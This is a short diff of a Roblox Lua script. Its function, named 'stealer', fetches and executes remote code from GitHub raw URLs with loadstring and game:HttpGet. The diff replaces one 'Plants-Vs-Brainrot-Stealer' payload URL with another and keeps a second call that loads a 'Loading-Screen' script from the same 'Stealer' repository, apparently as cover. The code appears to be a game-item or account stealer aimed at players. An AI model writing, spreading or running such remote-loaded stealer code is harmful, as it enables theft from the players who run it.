@@ -1,5 +1,5 @@
 local function stealer()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ingenioushits/Stealer/refs/heads/main/Plants-Vs-Brainrot-Stealer.lua",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rayz-Hub-Main/Stealer/refs/heads/main/Plants-Vs-Zomvie-Hah", true))()
 end
 local function loadui()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ingenioushits/Stealer/refs/heads/main/Loading-Screen-Lua",true))()
